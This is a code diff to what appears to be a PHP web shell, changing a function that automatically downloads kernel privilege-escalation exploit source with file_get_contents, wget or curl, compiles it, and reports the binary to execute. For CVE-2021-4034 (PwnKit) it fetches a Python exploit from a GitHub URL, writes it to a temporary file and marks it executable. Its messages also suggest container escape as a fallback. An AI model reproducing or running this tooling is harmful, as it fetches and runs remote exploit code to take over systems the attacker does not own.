@@ -2301,6 +2301,8 @@ function auto_compile_kernel_exploit($cve, $kernel_version) {
     
     if (!isset($exploit_db[$cve])) {
         $results['output'] .= "❌ CVE tidak ada di database\n";
+        $results['output'] .= "   CVE: $cve tidak ditemukan dalam database\n";
+        $results['output'] .= "   💡 Silakan tambahkan ke database atau gunakan CVE yang tersedia\n";
         return $results;
     }
     
@@ -2309,13 +2311,52 @@ function auto_compile_kernel_exploit($cve, $kernel_version) {
     // METHOD 2: If compiler available, download and compile
     if ($compiler) {
         $results['output'] .= "[2/5] Downloading source...\n";
+        $results['output'] .= "   URL: " . $exploit['source'] . "\n";
         $source_file = $tmp_dir . '/exploit.c';
-        $source_content = @file_get_contents($exploit['source']);
         
-        if (!$source_content) {
-            // Fallback to wget/curl
-            $wget_cmd = "wget -qO- " . escapeshellarg($exploit['source']) . " 2>/dev/null || curl -sL " . escapeshellarg($exploit['source']) . " 2>/dev/null";
+        // Try to get with proper HTTP status checking
+        $source_content = false;
+        $http_status = 0;
+        $error_msg = '';
+        
+        // Method 1: file_get_contents with stream context for status
+        $context = stream_context_create([
+            'http' => [
+                'timeout' => 30,
+                'ignore_errors' => true
+            ]
+        ]);
+        $source_content = @file_get_contents($exploit['source'], false, $context);
+        
+        // Check HTTP status from response headers
+        if (isset($http_response_header)) {
+            foreach ($http_response_header as $header) {
+                if (preg_match('/HTTP\/[\d\.]+\s+(\d+)/', $header, $matches)) {
+                    $http_status = intval($matches[1]);
+                    break;
+                }
+            }
+        }
+        
+        // If 404 or empty, try fallback
+        if ($http_status === 404 || !$source_content || strlen($source_content) < 100) {
+            $results['output'] .= "   ⚠️ file_get_contents failed (HTTP $http_status), trying wget/curl...\n";
+            $wget_cmd = "wget -qO- " . escapeshellarg($exploit['source']) . " 2>&1 || curl -sL " . escapeshellarg($exploit['source']) . " 2>&1";
             $source_content = execute_shell_command($wget_cmd);
+            
+            // Check wget/curl error messages
+            if (strpos($source_content, '404') !== false || 
+                strpos($source_content, 'Not Found') !== false ||
+                strpos($source_content, 'ERROR') !== false) {
+                $error_msg = 'URL returned 404 or error';
+                $results['output'] .= "   ❌ SOURCE URL NOT FOUND (404): " . $exploit['source'] . "\n";
+                $results['output'] .= "   💡 Please check and update the CVE database URL\n";
+            }
+        }
+        
+        if ($http_status === 404) {
+            $results['output'] .= "   ❌ SOURCE URL NOT FOUND (404): " . $exploit['source'] . "\n";
+            $results['output'] .= "   💡 URL needs to be updated in the CVE database\n";
         }
         
         if ($source_content && strlen($source_content) > 100 && strpos($source_content, '<html') === false) {
@@ -2341,13 +2382,32 @@ function auto_compile_kernel_exploit($cve, $kernel_version) {
                 $results['output'] .= "Execute: $binary_path\n\n";
                 return $results;
             } else {
-                $results['output'] .= "❌ Compile failed\n$compile_output\n\n";
+                $results['output'] .= "❌ Compile failed\n";
+                $results['output'] .= "   Compiler: $compiler\n";
+                $results['output'] .= "   Error: " . substr($compile_output, 0, 500) . "\n\n";
+                $results['output'] .= "   💡 Possible causes:\n";
+                $results['output'] .= "      - Missing dependencies/headers\n";
+                $results['output'] .= "      - Source code incompatible with this kernel\n";
+                $results['output'] .= "      - Compiler version mismatch\n\n";
             }
         } else {
-            $results['output'] .= "❌ Download failed\n\n";
+            $results['output'] .= "❌ Download failed\n";
+            if ($http_status !== 404 && $http_status !== 0) {
+                $results['output'] .= "   HTTP Status: $http_status\n";
+            }
+            if (strlen($source_content) < 100 && strlen($source_content) > 0) {
+                $results['output'] .= "   Response too short (" . strlen($source_content) . " bytes)\n";
+            }
+            if (strpos($source_content, '<html') !== false) {
+                $results['output'] .= "   Received HTML instead of source code (possibly blocked by WAF/cloudflare)\n";
+            }
+            $results['output'] .= "   URL: " . $exploit['source'] . "\n\n";
         }
     } else {
-        $results['output'] .= "❌ No compiler found\n\n";
+        $results['output'] .= "❌ No compiler found\n";
+        $results['output'] .= "   Checked: gcc, clang, tcc, cc\n";
+        $results['output'] .= "   💡 Install gcc: apt-get install gcc / yum install gcc\n";
+        $results['output'] .= "   💡 Or try Python-based exploits if available\n\n";
     }
     
     // METHOD 3: Try Python-based exploits
@@ -2360,11 +2420,17 @@ function auto_compile_kernel_exploit($cve, $kernel_version) {
         // For CVE-2021-4034 (PwnKit), try Python version
         if ($cve === 'CVE-2021-4034') {
             $py_exploit = 'https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py';
+            $results['output'] .= "   [Python] Trying: $py_exploit\n";
             $py_content = @file_get_contents($py_exploit);
             if (!$py_content) {
-                $py_content = execute_shell_command("wget -qO- $py_exploit 2>/dev/null || curl -sL $py_exploit 2>/dev/null");
+                $py_content = execute_shell_command("wget -qO- $py_exploit 2>&1 || curl -sL $py_exploit 2>&1");
+                if (strpos($py_content, '404') !== false || strpos($py_content, 'Not Found') !== false) {
+                    $results['output'] .= "   ❌ PYTHON URL NOT FOUND (404): $py_exploit\n";
+                    $results['output'] .= "   💡 Please update the Python exploit URL\n";
+                    $py_content = false;
+                }
             }
-            if ($py_content && strlen($py_content) > 100) {
+            if ($py_content && strlen($py_content) > 100 && strpos($py_content, '<html') === false) {
                 $py_file = $tmp_dir . '/pwnkit.py';
                 @file_put_contents($py_file, $py_content);
                 chmod($py_file, 0755);
@@ -2374,6 +2440,8 @@ function auto_compile_kernel_exploit($cve, $kernel_version) {
                 $results['output'] .= "✅ PYTHON EXPLOIT DOWNLOADED!\n";
                 $results['output'] .= "Execute: $python $py_file\n\n";
                 return $results;
+            } elseif ($py_content && strpos($py_content, '404') === false) {
+                $results['output'] .= "   ❌ Python download failed (invalid content)\n";
             }
         }
     }
@@ -2397,6 +2465,13 @@ function auto_compile_kernel_exploit($cve, $kernel_version) {
     
     // ALL METHODS FAILED
     $results['output'] .= "\n❌ ALL AUTO METHODS FAILED\n\n";
+    $results['output'] .= "╔══════════════════════════════════════════════════════════════╗\n";
+    $results['output'] .= "║  🔧 BROKEN URL - PLEASE UPDATE CVE DATABASE                  ║\n";
+    $results['output'] .= "╠══════════════════════════════════════════════════════════════╣\n";
+    $results['output'] .= "║  CVE: $cve\n";
+    $results['output'] .= "║  URL: " . $exploit['source'] . "\n";
+    $results['output'] .= "║  Issue: URL returned 404 or is not accessible\n";
+    $results['output'] .= "╚══════════════════════════════════════════════════════════════╝\n\n";
     $results['output'] .= "Alternatives:\n";
     $results['output'] .= "1. Upload pre-compiled binary manually\n";
     $results['output'] .= "2. Use container escape (if in Docker)\n";
@@ -3421,7 +3496,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 290326 1710</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 290326 1718</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
